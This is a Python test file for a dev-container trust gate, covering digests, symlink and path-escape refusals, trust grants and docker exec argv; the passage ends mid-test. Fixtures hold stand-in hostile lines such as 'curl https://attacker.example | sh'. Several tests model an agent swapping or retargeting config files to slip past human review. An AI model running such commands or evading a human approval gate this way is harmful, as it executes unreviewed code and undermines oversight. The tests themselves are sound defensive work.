"""Unit tests for Dev Container support (``kiro_crew.devcontainer``).

Covers the pure/host-side contracts that must hold before any container is
touched: config lookup order, the tree-wide trust digest, the hardened config
read path, the digest-bound trust store, the dashboard preview payload, the
``docker exec`` argv shape, the ``devcontainer up`` result-record scan, the
trust gate firing before any subprocess, the post-build digest
re-verification, the environ-scan kill path, the id-label status/down
fallbacks, and the handler's project-path admission check.

No test here reaches Docker, the devcontainer CLI, or the network: the trust
store is redirected at a ``tmp_path`` via a monkeypatched ``config_dir``, and
every test that exercises ``up()`` / ``status()`` / ``down()`` / ``kill_exec()``
replaces ``asyncio.create_subprocess_exec`` with a recorder that either fails
loudly (trust-gate tests, which must spawn nothing) or returns scripted fake
processes.

Several classes carry a REVERT-VERIFIED note naming the source line the test
pins and the assertion that flips when the fix is reverted; those cover the
adversarial-review findings B1 (arbitrary-file read through the preview path),
M1 (spoofable pidfile kill target), M3 (config swap between trust grant and
build), and the preview-to-grant TOCTOU (a config swap between the human
reading the trust prompt and clicking Trust, pinned at both the
``grant_trust`` and endpoint layers).
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import os
import re
import uuid
from pathlib import Path
from types import SimpleNamespace

import pytest

from kiro_crew import devcontainer as devc
from kiro_crew.dashboard.handlers import devcontainer as devc_handlers

# ---------------------------------------------------------------------------
# Fixtures / helpers
# ---------------------------------------------------------------------------

_SAMPLE_CONFIG = json.dumps({"name": "kirocrew-dev", "image": "mcr.io/devcontainers/base:ubuntu"})


@pytest.fixture
def trust_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Redirect the trust store into an isolated data home."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(devc, "config_dir", lambda: home)
    return home


@pytest.fixture
def symlinks_supported(tmp_path: Path) -> None:
    """Skip when this host cannot create symlinks at all.

    Windows grants ``SeCreateSymbolicLinkPrivilege`` only to an elevated
    process or a machine in Developer Mode, so ``Path.symlink_to`` raises
    ``OSError`` on an ordinary CI runner. This is a capability PROBE rather
    than an ``IS_WINDOWS`` guard on purpose: on a privileged Windows box the
    probe succeeds and the tests below run for real, so the symlink guards
    they pin stay covered instead of being skipped forever on the platform.
    Same privilege backs file and directory links, so one file probe answers
    for both.
    """
    target = tmp_path / ".symlink-probe-target"
    target.write_bytes(b"")
    link = tmp_path / ".symlink-probe-link"
    try:
        link.symlink_to(target)
    except (OSError, NotImplementedError) as exc:  # pragma: no cover -- Windows only
        pytest.skip(f"host cannot create symlinks: {exc}")
    finally:
        # Leave tmp_path pristine: several callers rglob a tree rooted here.
        link.unlink(missing_ok=True)
        target.unlink(missing_ok=True)


def _write_primary(root: Path, body: str = _SAMPLE_CONFIG) -> Path:
    """Write ``.devcontainer/devcontainer.json`` under ``root``.

    ``write_bytes``, never ``write_text``: the digest and the preview's ``raw``
    are byte-exact contracts, and text mode translates ``\\n`` to ``\\r\\n`` on
    Windows (and encodes through cp1252 rather than UTF-8).
    """
    path = root / ".devcontainer" / "devcontainer.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(body.encode())
    return path


def _write_fallback(root: Path, body: str = _SAMPLE_CONFIG) -> Path:
    """Write the top-level ``.devcontainer.json`` under ``root``."""
    path = root / ".devcontainer.json"
    path.write_bytes(body.encode())
    return path


def _info(**over: object) -> devc.DevcontainerInfo:
    base: dict = {
        "container_id": "c0ffee1234567890",
        "remote_workspace_folder": "/workspaces/proj",
        "remote_user": "vscode",
        "project_dir": "/host/proj",
        "config_digest": "d" * 64,
        "created_at": 0.0,
    }
    base.update(over)
    return devc.DevcontainerInfo(**base)  # type: ignore[arg-type]


class _FakeProc:
    """Stand-in for ``asyncio.subprocess.Process`` with scripted output.

    ``on_communicate`` runs inside ``communicate()``, which is how the M3
    TOCTOU test mutates the config tree *while* the fake build is in flight.
    """

    def __init__(
        self,
        *,
        stdout: bytes = b"",
        stderr: bytes = b"",
        returncode: int = 0,
        on_communicate=None,  # type: ignore[no-untyped-def]
    ) -> None:
        self._stdout = stdout
        self._stderr = stderr
        self.returncode = returncode
        self._on_communicate = on_communicate
        self.killed = False

    async def communicate(self) -> tuple[bytes, bytes]:
        if self._on_communicate is not None:
            self._on_communicate()
        return self._stdout, self._stderr

    async def wait(self) -> int:
        if self._on_communicate is not None:
            self._on_communicate()
        return self.returncode

    def kill(self) -> None:
        self.killed = True


class _ExecRecorder:
    """``create_subprocess_exec`` stub: records argv, returns scripted procs.

    Procs are handed out in call order (each flow under test spawns a fixed,
    documented sequence); any call past the script gets a benign success.
    """

    def __init__(self, *procs: _FakeProc) -> None:
        self.calls: list[list[str]] = []
        self._procs = list(procs)

    async def __call__(self, *argv: str, **kw: object) -> _FakeProc:
        self.calls.append(list(argv))
        return self._procs.pop(0) if self._procs else _FakeProc()


def _up_ok(container_id: str = "cid-ok", **on: object) -> _FakeProc:
    """A ``devcontainer up --log-format json`` success record."""
    record = {
        "outcome": "success",
        "containerId": container_id,
        "remoteUser": "vscode",
        "remoteWorkspaceFolder": "/workspaces/proj",
    }
    return _FakeProc(stdout=(json.dumps(record) + "\n").encode(), **on)  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# find_devcontainer_config
# ---------------------------------------------------------------------------


class TestFindDevcontainerConfig:
    def test_primary_location_is_found(self, tmp_path: Path) -> None:
        expected = _write_primary(tmp_path)
        assert devc.find_devcontainer_config(tmp_path) == expected

    def test_fallback_location_is_found(self, tmp_path: Path) -> None:
        expected = _write_fallback(tmp_path)
        assert devc.find_devcontainer_config(tmp_path) == expected

    def test_primary_wins_over_fallback(self, tmp_path: Path) -> None:
        """Spec lookup order: the .devcontainer/ dir shadows the flat file."""
        primary = _write_primary(tmp_path)
        _write_fallback(tmp_path, '{"name": "ignored"}')
        assert devc.find_devcontainer_config(tmp_path) == primary

    def test_none_when_absent(self, tmp_path: Path) -> None:
        assert devc.find_devcontainer_config(tmp_path) is None

    def test_directory_named_like_the_flat_file_is_not_a_config(self, tmp_path: Path) -> None:
        """is_file() guards the fallback: a directory must not be returned."""
        (tmp_path / ".devcontainer.json").mkdir()
        assert devc.find_devcontainer_config(tmp_path) is None

    def test_accepts_str_project_dir(self, tmp_path: Path) -> None:
        expected = _write_primary(tmp_path)
        assert devc.find_devcontainer_config(str(tmp_path)) == expected


class TestConfigDigest:
    """The trust digest covers the whole ``.devcontainer/`` tree.

    REVERT-VERIFIED (M3) — pins ``config_digest``'s tree branch in
    ``devcontainer.py`` (``if parent.name == ".devcontainer":`` … the rglob
    walk + ``b"tree"`` marker). Reverting it to the old
    ``sha256(config_bytes)`` makes
    ``test_sibling_file_content_changes_the_digest``,
    ``test_adding_a_sibling_file_changes_the_digest``,
    ``test_nested_sibling_file_is_covered`` and
    ``test_tree_digest_recomputes_from_relpath_content_and_marker`` fail: each
    of those mutates a build input while leaving devcontainer.json
    byte-identical, so a json-only digest is unchanged and a granted trust
    would survive a Dockerfile / postCreateCommand script swap.
    """

    def test_tree_digest_recomputes_from_relpath_content_and_marker(self, tmp_path: Path) -> None:
        cfg = _write_primary(tmp_path)
        h = hashlib.sha256()
        h.update(b"devcontainer.json")
        h.update(b"\0")
        h.update(cfg.read_bytes())
        h.update(b"\0")
        h.update(b"tree")
        assert devc.config_digest(cfg) == h.hexdigest()
        # Explicitly NOT the old json-only digest.
        assert devc.config_digest(cfg) != hashlib.sha256(cfg.read_bytes()).hexdigest()

    def test_digest_is_stable_for_identical_input(self, tmp_path: Path) -> None:
        cfg = _write_primary(tmp_path)
        (cfg.parent / "Dockerfile").write_bytes(b"FROM ubuntu:24.04\n")
        first = devc.config_digest(cfg)
        assert devc.config_digest(cfg) == first
        # Rewriting the same bytes is not a change: trust binds to content.
        cfg.write_bytes(_SAMPLE_CONFIG.encode())
        assert devc.config_digest(cfg) == first

    def test_digest_is_path_independent(self, tmp_path: Path) -> None:
        """Relpath-keyed, so two projects with identical trees agree."""
        digests = []
        for name in ("a", "b"):
            root = tmp_path / name
            root.mkdir()
            cfg = _write_primary(root)
            (cfg.parent / "Dockerfile").write_bytes(b"FROM ubuntu:24.04\n")
            digests.append(devc.config_digest(cfg))
        assert digests[0] == digests[1]

    def test_sibling_file_content_changes_the_digest(self, tmp_path: Path) -> None:
        """M3: the build input a byte-identical json points at."""
        body = json.dumps({"name": "p", "build": {"dockerfile": "Dockerfile"}})
        cfg = _write_primary(tmp_path, body)
        dockerfile = cfg.parent / "Dockerfile"
        dockerfile.write_bytes(b"FROM ubuntu:24.04\n")
        before = devc.config_digest(cfg)

        dockerfile.write_bytes(b"FROM ubuntu:24.04\nRUN curl https://attacker.example | sh\n")
        assert cfg.read_bytes() == body.encode()  # the trusted json never moved
        assert devc.config_digest(cfg) != before

    def test_adding_a_sibling_file_changes_the_digest(self, tmp_path: Path) -> None:
        cfg = _write_primary(tmp_path)
        before = devc.config_digest(cfg)
        (cfg.parent / "post-create.sh").write_bytes(b"#!/bin/sh\necho hi\n")
        assert devc.config_digest(cfg) != before

    def test_nested_sibling_file_is_covered(self, tmp_path: Path) -> None:
        cfg = _write_primary(tmp_path)
        nested = cfg.parent / "scripts" / "install.sh"
        nested.parent.mkdir()
        nested.write_bytes(b"#!/bin/sh\n")
        before = devc.config_digest(cfg)
        nested.write_bytes(b"#!/bin/sh\ncurl https://attacker.example | sh\n")
        assert devc.config_digest(cfg) != before

    def test_symlink_in_the_tree_is_refused_not_skipped(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        """A link inside .devcontainer/ must REFUSE the digest, not be skipped.

        Pins the fix for the GPT review's content-binding hole: skipping a
        symlink leaves it outside the hash, so the agent can retarget it (or
        mutate its target) after the grant and a lifecycle hook such as
        ``bash setup.sh`` would execute unreviewed code under a trust that
        still validates. Revert the ``raise`` in config_digest and both asserts
        below fail (the pre-fix code returned the unchanged `before` digest).
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        outside = tmp_path / "outside.txt"
        outside.write_bytes(b"original")
        before = devc.config_digest(cfg)
        assert before  # clean tree hashes fine

        (cfg.parent / "link.txt").symlink_to(outside)
        with pytest.raises(devc.DevcontainerError, match="symlink"):
            devc.config_digest(cfg)
        # And the refusal is not a one-off: mutating the target does not make
        # it hashable again.
        outside.write_bytes(b"mutated")
        with pytest.raises(devc.DevcontainerError, match="symlink"):
            devc.config_digest(cfg)

    def test_symlinked_subdirectory_is_refused(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        """A linked DIRECTORY is refused too — rglob yields it before its
        contents, and its subtree is equally retargetable."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        elsewhere = tmp_path / "elsewhere"
        elsewhere.mkdir()
        (elsewhere / "payload.sh").write_bytes(b"echo pwned\n")

        (cfg.parent / "scripts").symlink_to(elsewhere, target_is_directory=True)
        with pytest.raises(devc.DevcontainerError, match="symlink"):
            devc.config_digest(cfg)

    def test_untrusted_after_symlink_appears(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        """is_trusted() must go False when a symlink lands in a trusted tree.

        The grant cannot be validated against a tree whose digest is refused,
        so trust fails closed rather than silently holding.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)
        assert devc.is_trusted(project) is True

        (cfg.parent / "link.txt").symlink_to(tmp_path / "outside.txt")
        assert devc.is_trusted(project) is False

    def test_root_layout_digest_is_single_file_plus_marker(self, tmp_path: Path) -> None:
        """``.devcontainer.json`` has no directory: one file + ``b"file"``."""
        cfg = _write_fallback(tmp_path)
        assert devc.config_digest(cfg) == hashlib.sha256(cfg.read_bytes() + b"file").hexdigest()

    def test_layout_markers_prevent_cross_layout_collision(self, tmp_path: Path) -> None:
        a = tmp_path / "a"
        a.mkdir()
        b = tmp_path / "b"
        b.mkdir()
        assert devc.config_digest(_write_primary(a)) != devc.config_digest(_write_fallback(b))


class TestConfigReadHardening:
    """B1: the preview read path returns bytes to the dashboard caller.

    REVERT-VERIFIED (B1) — pins two guards:
      * ``find_devcontainer_config``'s ``not candidate.is_symlink()``;
      * ``_read_config_bytes``'s containment check (``if not
        resolved.startswith(root...)``) and its ``is_sensitive_path`` screen.

    Revert the symlink check and ``test_symlink_leaf_is_treated_as_absent``
    fails: the function returns a link, and ``config_preview`` happily reads
    its target. Revert the containment check and
    ``test_read_refuses_a_config_escaping_the_project`` /
    ``test_preview_surfaces_the_escape_refusal`` fail: a symlinked
    ``.devcontainer`` parent (invisible to the leaf-only O_NOFOLLOW) turns the
    preview endpoint into an arbitrary-file read. Revert the sensitive-path
    screen and ``test_read_refuses_a_sensitive_target`` fails.
    """

    def test_symlink_leaf_is_treated_as_absent(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        secret = tmp_path / "credentials"
        secret.write_bytes(b"aws_secret_access_key = nope\n")
        leaf = project / ".devcontainer" / "devcontainer.json"
        leaf.parent.mkdir(parents=True)
        leaf.symlink_to(secret)

        assert devc.find_devcontainer_config(project) is None
        assert devc.is_trusted(project) is False

    def test_symlink_root_layout_leaf_is_treated_as_absent(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        secret = tmp_path / "credentials"
        secret.write_bytes(b"nope")
        (project / ".devcontainer.json").symlink_to(secret)
        assert devc.find_devcontainer_config(project) is None

    def _escaping_project(self, tmp_path: Path) -> tuple[Path, Path]:
        """Project whose ``.devcontainer`` PARENT dir is a symlink outside it.

        The leaf is a real file, so the lstat check in
        ``find_devcontainer_config`` cannot see the escape — only the realpath
        containment check in ``_read_config_bytes`` can.

        Callers MUST request the ``symlinks_supported`` fixture: this helper
        cannot skip on its own behalf.
        """
        project = tmp_path / "proj"
        project.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "devcontainer.json").write_bytes(b'{"image": "attacker/img:latest"}')
        (project / ".devcontainer").symlink_to(outside, target_is_directory=True)
        return project, project / ".devcontainer" / "devcontainer.json"

    def test_read_refuses_a_config_escaping_the_project(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        project, cfg = self._escaping_project(tmp_path)
        # Lookup still returns it: the leaf itself is a regular file.
        assert devc.find_devcontainer_config(project) == cfg
        with pytest.raises(devc.DevcontainerError, match="outside the project"):
            devc._read_config_bytes(cfg)

    def test_preview_surfaces_the_escape_refusal(
        self, tmp_path: Path, trust_home: Path, symlinks_supported: None
    ) -> None:
        project, _ = self._escaping_project(tmp_path)
        with pytest.raises(devc.DevcontainerError, match="outside the project"):
            devc.config_preview(project)

    def test_read_refuses_a_sensitive_target(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.security as security

        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        monkeypatch.setattr(security, "is_sensitive_path", lambda p: True)
        with pytest.raises(devc.DevcontainerError, match="sensitive path"):
            devc._read_config_bytes(cfg)

    def test_preview_surfaces_the_sensitive_refusal(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.security as security

        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        monkeypatch.setattr(security, "is_sensitive_path", lambda p: True)
        with pytest.raises(devc.DevcontainerError, match="sensitive path"):
            devc.config_preview(project)

    def test_read_refuses_a_non_regular_file(self, tmp_path: Path) -> None:
        """A directory at the config path must be refused, whichever gate fires.

        Two different gates reject it depending on the platform, and BOTH fail
        closed with a DevcontainerError, which is the property under test:
          * POSIX — ``os.open`` on a directory succeeds, so the ``fstat``
            ``S_ISREG`` check rejects it ("not a regular file");
          * Windows — ``os.open`` of a directory itself fails with EACCES
            before any fstat, so the refusal surfaces as "cannot open".
        Matching either keeps the assertion on the refusal rather than on which
        layer happened to produce it.
        """
        project = tmp_path / "proj"
        project.mkdir()
        as_dir = project / ".devcontainer" / "devcontainer.json"
        as_dir.mkdir(parents=True)
        with pytest.raises(devc.DevcontainerError, match="not a regular file|cannot open"):
            devc._read_config_bytes(as_dir)

    def test_read_reports_a_missing_file_as_a_devcontainer_error(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        (project / ".devcontainer").mkdir(parents=True)
        with pytest.raises(devc.DevcontainerError, match="cannot open"):
            devc._read_config_bytes(project / ".devcontainer" / "devcontainer.json")

    def test_read_accepts_a_plain_in_project_config(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        assert devc._read_config_bytes(cfg) == _SAMPLE_CONFIG.encode()
        assert devc._read_config_bytes(_write_fallback(project)) == _SAMPLE_CONFIG.encode()


# ---------------------------------------------------------------------------
# Trust store
# ---------------------------------------------------------------------------


class TestTrustStore:
    def test_grant_is_trusted_revoke_round_trip(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)

        assert devc.is_trusted(project) is False
        digest = devc.grant_trust(project)
        assert digest == devc.config_digest(cfg)
        assert devc.is_trusted(project) is True

        assert devc.revoke_trust(project) is True
        assert devc.is_trusted(project) is False
        # Second revoke is a no-op, not an error.
        assert devc.revoke_trust(project) is False

    def test_grant_records_digest_and_config_path(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)

        data = json.loads((trust_home / "devcontainers" / "trust.json").read_text(encoding="utf-8"))
        entry = data[os.path.realpath(str(project))]
        assert entry["digest"] == devc.config_digest(cfg)
        assert entry["config_path"] == str(cfg)
        assert isinstance(entry["granted_at"], float)

    def test_trust_invalidated_when_config_bytes_change(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """A config edit (by a human OR the agent) forces a fresh decision."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)
        assert devc.is_trusted(project) is True

        cfg.write_bytes(json.dumps({"name": "kirocrew-dev", "image": "evil:latest"}).encode())
        assert devc.is_trusted(project) is False

        # Restoring the exact original bytes restores the grant: trust binds to
        # content, not to an edit counter. write_bytes, so the restore really is
        # byte-identical to _write_primary's (text mode would add CR on Windows).
        cfg.write_bytes(_SAMPLE_CONFIG.encode())
        assert devc.is_trusted(project) is True

    def test_trust_does_not_leak_to_a_sibling_project(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        a = tmp_path / "a"
        b = tmp_path / "b"
        for p in (a, b):
            p.mkdir()
            _write_primary(p)
        devc.grant_trust(a)
        assert devc.is_trusted(a) is True
        assert devc.is_trusted(b) is False

    def test_is_trusted_false_without_config(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        assert devc.is_trusted(project) is False

    def test_grant_without_config_raises(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        with pytest.raises(devc.DevcontainerError):
            devc.grant_trust(project)

    def test_corrupt_trust_file_is_treated_as_empty(self, tmp_path: Path, trust_home: Path) -> None:
        store = trust_home / "devcontainers" / "trust.json"
        store.parent.mkdir(parents=True, exist_ok=True)
        store.write_bytes(b"{not json")
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        assert devc.is_trusted(project) is False
        # ...and a later grant still succeeds, overwriting the garbage.
        devc.grant_trust(project)
        assert devc.is_trusted(project) is True

    def test_write_is_atomic_replace_with_no_tmp_residue(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The store lands via os.replace(tmp, path): readers never see a
        half-written file, and the tmp sibling is not left behind."""
        calls: list[tuple[str, str]] = []
        real_replace = os.replace

        def spy(src, dst, *a, **kw):  # type: ignore[no-untyped-def]
            calls.append((str(src), str(dst)))
            return real_replace(src, dst, *a, **kw)

        monkeypatch.setattr(os, "replace", spy)

        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)

        store = trust_home / "devcontainers" / "trust.json"
        assert calls == [(str(store.with_suffix(".tmp")), str(store))]
        assert store.is_file()
        assert not store.with_suffix(".tmp").exists()
        assert sorted(p.name for p in store.parent.iterdir()) == ["trust.json"]


# ---------------------------------------------------------------------------
# grant_trust: binding the grant to the reviewed bytes
# ---------------------------------------------------------------------------


class TestGrantTrustExpectedDigest:
    """``expected_digest`` closes the preview→grant window.

    Without it the digest recorded by ``grant_trust`` is computed from whatever
    is on disk at grant time, so an agent that rewrote ``.devcontainer/``
    between the human reading the preview and clicking Trust would have its OWN
    configuration authorized.
    """

    def test_matching_digest_grants(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)

        assert devc.grant_trust(project, reviewed) == reviewed
        assert devc.is_trusted(project) is True

    def test_stale_digest_raises_and_writes_no_grant(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """REVERT-VERIFIED against the ``expected_digest`` guard in
        ``devcontainer.grant_trust``: drop the raise and the config the human
        never saw gets trusted, so ``is_trusted`` flips to True and the store
        grows an entry. The security property is the ABSENCE of a grant, not
        merely the exception — a raise after the write would still leave the
        swapped config authorized."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)

        # The agent swaps in its own configuration after the preview was read.
        cfg.write_bytes(json.dumps({"name": "kirocrew-dev", "image": "evil:latest"}).encode())
        with pytest.raises(devc.DevcontainerConfigChanged):
            devc.grant_trust(project, reviewed)

        assert devc.is_trusted(project) is False
        assert not (trust_home / "devcontainers" / "trust.json").exists()

    def test_stale_digest_leaves_an_existing_grant_untouched(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """A refused grant must not disturb the store's other entries either."""
        other = tmp_path / "other"
        other.mkdir()
        _write_primary(other)
        devc.grant_trust(other)
        store = trust_home / "devcontainers" / "trust.json"
        before = store.read_bytes()

        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)
        cfg.write_bytes(json.dumps({"name": "x", "image": "evil:latest"}).encode())
        with pytest.raises(devc.DevcontainerConfigChanged):
            devc.grant_trust(project, reviewed)

        assert store.read_bytes() == before
        assert os.path.realpath(str(project)) not in json.loads(store.read_text(encoding="utf-8"))

    def test_config_changed_is_a_devcontainer_error(self) -> None:
        """Subclassing keeps every existing ``except DevcontainerError`` handler
        (up(), the rebuild endpoint, the status path) catching it."""
        assert issubclass(devc.DevcontainerConfigChanged, devc.DevcontainerError)
        assert issubclass(devc.DevcontainerConfigChanged, RuntimeError)

    def test_none_digest_still_grants(self, tmp_path: Path, trust_home: Path) -> None:
        """Deliberate no-preview callers (CLI, tests) keep the unbound form."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)

        assert devc.grant_trust(project) == devc.config_digest(cfg)
        assert devc.grant_trust(project, None) == devc.config_digest(cfg)
        assert devc.is_trusted(project) is True

    def test_no_config_raises_plain_error_not_config_changed(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Absent config is checked BEFORE the digest comparison, so the caller
        still gets the 404-mapped error rather than a 409-mapped one."""
        project = tmp_path / "proj"
        project.mkdir()
        with pytest.raises(devc.DevcontainerError) as excinfo:
            devc.grant_trust(project, "deadbeef")
        assert not isinstance(excinfo.value, devc.DevcontainerConfigChanged)


# ---------------------------------------------------------------------------
# config_preview
# ---------------------------------------------------------------------------


class TestConfigPreview:
    def test_returns_digest_raw_and_trusted(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)

        preview = devc.config_preview(project)
        assert preview["config_path"] == str(cfg)
        assert preview["digest"] == devc.config_digest(cfg)
        assert preview["raw"] == _SAMPLE_CONFIG
        assert preview["name"] == "kirocrew-dev"
        assert preview["image"] == "mcr.io/devcontainers/base:ubuntu"
        assert preview["trusted"] is False

        devc.grant_trust(project)
        assert devc.config_preview(project)["trusted"] is True

    def test_tolerates_jsonc_line_comments(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        body = (
            "// Kiro Crew dev container\n"
            "{\n"
            '  "name": "commented",\n'
            "  // the base image\n"
            '  "image": "ubuntu:24.04"\n'
            "}\n"
        )
        _write_primary(project, body)

        preview = devc.config_preview(project)
        assert preview["name"] == "commented"
        assert preview["image"] == "ubuntu:24.04"
        # raw is verbatim, comments included — the human sees what they trust.
        assert preview["raw"] == body

    def test_unparseable_config_still_previews_raw(self, tmp_path: Path, trust_home: Path) -> None:
        """Trailing commas etc. are the CLI's problem; the prompt must still
        render the bytes so a human can read them."""
        project = tmp_path / "proj"
        project.mkdir()
        body = '{"name": "broken",}'
        cfg = _write_primary(project, body)

        preview = devc.config_preview(project)
        assert preview["raw"] == body
        assert preview["name"] is None
        assert preview["image"] is None
        assert preview["digest"] == devc.config_digest(cfg)

    def test_raw_is_capped(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project, "{" + " " * 100_000 + "}")
        assert len(devc.config_preview(project)["raw"]) == 65536

    def test_missing_config_raises(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        with pytest.raises(devc.DevcontainerError):
            devc.config_preview(project)


# ---------------------------------------------------------------------------
# exec_argv
# ---------------------------------------------------------------------------


class TestExecArgv:
    def _split(self, argv: list[str]) -> tuple[list[str], list[str]]:
        """Split at the ``sh -c <script> sh`` boundary -> (prefix, inner)."""
        idx = argv.index("sh")
        return argv[:idx], argv[idx:]

    def test_docker_exec_interactive_prefix(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(), ["kiro-cli", "acp"], env={}, exec_id="e1"
        )
        assert argv[:3] == ["docker", "exec", "-i"]

    def test_remote_user_forwarded_only_when_set(self) -> None:
        mgr = devc.DevcontainerManager()
        with_user = mgr.exec_argv(_info(remote_user="vscode"), ["x"], env={}, exec_id="e1")
        assert "-u" in with_user
        assert with_user[with_user.index("-u") + 1] == "vscode"

        without = mgr.exec_argv(_info(remote_user=""), ["x"], env={}, exec_id="e1")
        assert "-u" not in without

    def test_workdir_defaults_to_remote_workspace_folder(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(remote_workspace_folder="/workspaces/proj"), ["x"], env={}, exec_id="e1"
        )
        assert argv[argv.index("-w") + 1] == "/workspaces/proj"

    def test_explicit_workdir_overrides(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(), ["x"], env={}, exec_id="e1", workdir="/workspaces/proj/sub"
        )
        assert argv[argv.index("-w") + 1] == "/workspaces/proj/sub"

    def test_env_forwarded_with_dash_e_including_exec_marker(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(),
            ["x"],
            env={"KIROCREW_SESSION_KEY": "sk-1", "KIROCREW_CHANNEL_ID": "C1"},
            exec_id="deadbeef",
        )
        pairs = {argv[i + 1] for i, tok in enumerate(argv) if tok == "-e"}
        assert "KIROCREW_SESSION_KEY=sk-1" in pairs
        assert "KIROCREW_CHANNEL_ID=C1" in pairs
        # docker exec does not inherit the host env: the marker must be explicit.
        assert f"{devc.DEVCONTAINER_EXEC_ENV}=deadbeef" in pairs

    def test_caller_env_is_not_mutated(self) -> None:
        env: dict[str, str] = {}
        devc.DevcontainerManager().exec_argv(_info(), ["x"], env=env, exec_id="e1")
        assert env == {}

    def test_container_id_precedes_the_shell_argv(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(container_id="abc123"), ["x"], env={}, exec_id="e1"
        )
        prefix, inner = self._split(argv)
        assert prefix[-1] == "abc123"
        assert inner[0] == "sh"
        assert inner[1] == "-c"

    def test_preamble_records_pidfile_and_prefers_setsid(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(), ["kiro-cli", "acp"], env={}, exec_id="abc"
        )
        script = argv[argv.index("-c") + 1]
        assert "echo $$ > /tmp/kirocrew-exec/abc.pid" in script
        assert "mkdir -p /tmp/kirocrew-exec" in script
        # setsid gives kill_exec() a process GROUP to signal; plain exec is the
        # fallback on images without it.
        assert 'exec setsid "$@"' in script
        assert 'exec "$@"' in script
        assert "command -v setsid" in script

    def test_inner_argv_appended_after_the_sh_argv_name(self) -> None:
        """``sh -c <script> sh <inner...>`` — the second 'sh' is $0, so the
        inner argv starts at $1 and is what "$@" expands to."""
        inner_argv = ["kiro-cli", "acp", "--agent", "kirocrew"]
        argv = devc.DevcontainerManager().exec_argv(_info(), inner_argv, env={}, exec_id="e1")
        assert argv[-len(inner_argv) - 1] == "sh"  # $0 placeholder
        assert argv[-len(inner_argv) :] == inner_argv

    def test_full_argv_order(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(container_id="cid", remote_user="node", remote_workspace_folder="/w"),
            ["kiro-cli", "acp"],
            env={"A": "1"},
            exec_id="x1",
        )
        script = argv[argv.index("-c") + 1]
        assert argv == [
            "docker",
            "exec",
            "-i",
            "-u",
            "node",
            "-w",
            "/w",
            "-e",
            "A=1",
            "-e",
            f"{devc.DEVCONTAINER_EXEC_ENV}=x1",
            "cid",
            "sh",
            "-c",
            script,
            "sh",
            "kiro-cli",
            "acp",
        ]


# ---------------------------------------------------------------------------
# _parse_up_output
# ---------------------------------------------------------------------------


class TestParseUpOutput:
    def test_picks_last_object_with_outcome_from_interleaved_log(self) -> None:
        stdout = "\n".join(
            [
                '{"type":"text","level":2,"text":"Resolving Dev Container"}',
                "not json at all",
                '{"outcome":"error","message":"stale record"}',
                '{"type":"text","level":2,"text":"Running lifecycle hooks"}',
                '{"outcome":"success","containerId":"abc123",'
                '"remoteUser":"vscode","remoteWorkspaceFolder":"/workspaces/p"}',
